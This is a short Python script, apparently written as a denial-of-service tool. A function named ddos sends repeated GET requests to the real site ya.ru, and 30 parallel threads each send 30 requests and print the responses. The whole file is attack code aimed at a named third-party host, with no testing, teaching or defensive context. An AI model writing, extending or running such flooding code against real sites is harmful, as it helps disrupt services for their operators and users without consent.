import requests
import threading

def ddos():
    for i in range(30):
        a = requests.get('http://ya.ru')
        print(a)

for j in range(30):
    threading.Thread(target=ddos).start()